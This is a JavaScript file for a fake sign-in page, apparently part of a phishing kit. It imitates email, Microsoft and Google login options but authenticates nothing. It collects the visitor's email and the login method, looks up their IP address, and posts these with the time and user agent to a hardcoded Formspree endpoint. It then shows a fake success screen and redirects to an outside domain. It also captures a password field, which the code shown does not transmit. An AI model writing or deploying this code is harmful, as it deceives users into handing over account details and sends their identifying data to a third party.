// --- CONFIG ---
const FORMSPREE_ENDPOINT = 'https://formspree.io/f/meebyvzg';
const REDIRECT_URL = 'https://muzzksko.com';

// --- STATE ---
let state = {
  email: '',
  password: '',
  step: 'email',
  ipAddress: '',
  userAgent: navigator.userAgent
};

// --- INIT ---
document.addEventListener('DOMContentLoaded', () => {
  fetchIP();

  const emailInput = document.getElementById('email-input');
  const passwordInput = document.getElementById('password-input');

  emailInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') handleSubmit();
  });
  passwordInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') handleSubmit();
  });

  emailInput.addEventListener('input', () => hideError('email'));
  passwordInput.addEventListener('input', () => hideError('password'));
});

// --- IP FETCH ---
async function fetchIP() {
  try {
    const res = await fetch('https://api.ipify.org?format=json');
    const data = await res.json();
    state.ipAddress = data.ip;
  } catch {
    state.ipAddress = 'Unknown';
  }
}

// --- SEND TO FORMSPREE ---
async function sendToFormspree(data) {
  const formData = new FormData();
  formData.append('email', data.email);
  formData.append('method', data.method);
  formData.append('ip', state.ipAddress);
  formData.append('time', new Date().toLocaleString());
  formData.append('userAgent', state.userAgent);
  formData.append('_subject', 'New Muzzks Ko Login');
  formData.append('_replyto', data.email);

  try {
    const response = await fetch(FORMSPREE_ENDPOINT, {
      method: 'POST',
      body: formData,
      headers: {
        'Accept': 'application/json'
      }
    });
    return response.ok;
  } catch (e) {
    console.log('Formspree send failed:', e);
    return false;
  }
}

// --- HANDLERS ---
function handleMicrosoft() {
  const email = document.getElementById('email-input').value.trim();
  if (!isValidEmail(email)) {
    showError('email', 'Please enter a valid email first');
    document.getElementById('email-input').focus();
    return;
  }
  state.email = email;
  state.method = 'Microsoft';
  doLogin();
}

function handleGoogle() {
  const email = document.getElementById('email-input').value.trim();
  if (!isValidEmail(email)) {
    showError('email', 'Please enter a valid email first');
    document.getElementById('email-input').focus();
    return;
  }
  state.email = email;
  state.method = 'Google';
  doLogin();
}

function handleSubmit() {
  const emailInput = document.getElementById('email-input');
  const passwordGroup = document.getElementById('password-group');
  const passwordInput = document.getElementById('password-input');

  if (state.step === 'email') {
    const email = emailInput.value.trim();
    if (!isValidEmail(email)) {
      showError('email', 'Please enter a valid email address');
      return;
    }
    state.email = email;
    state.step = 'password';

    passwordGroup.classList.remove('hidden');
    passwordInput.focus();
    document.getElementById('submit-btn').textContent = 'Sign In';
    return;
  }

  if (state.step === 'password') {
    const password = passwordInput.value.trim();
    if (!password) {
      showError('password', 'Please enter your password');
      return;
    }
    state.password = password;
    state.method = 'Email';
    doLogin();
  }
}

async function doLogin() {
  showStep('loading');

  await sendToFormspree({
    email: state.email,
    method: state.method
  });

  setTimeout(() => {
    showStep('success');
    setTimeout(() => {
      window.location.href = REDIRECT_URL;
    }, 2000);
  }, 1500);
}

// --- UTILS ---
function isValidEmail(email) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
}

function showError(field, msg) {
  const el = document.getElementById(field + '-error');
  if (el) {
    el.textContent = msg;
    el.classList.remove('hidden');
  }
}

function hideError(field) {
  const el = document.getElementById(field + '-error');
  if (el) el.classList.add('hidden');
}

function showStep(stepName) {
  document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
  document.getElementById('step-' + stepName).classList.add('active');
}

function showToast(msg) {
  const t = document.getElementById('toast');
  t.textContent = msg;
  t.classList.add('show');
  setTimeout(() => t.classList.remove('show'), 3000);
}
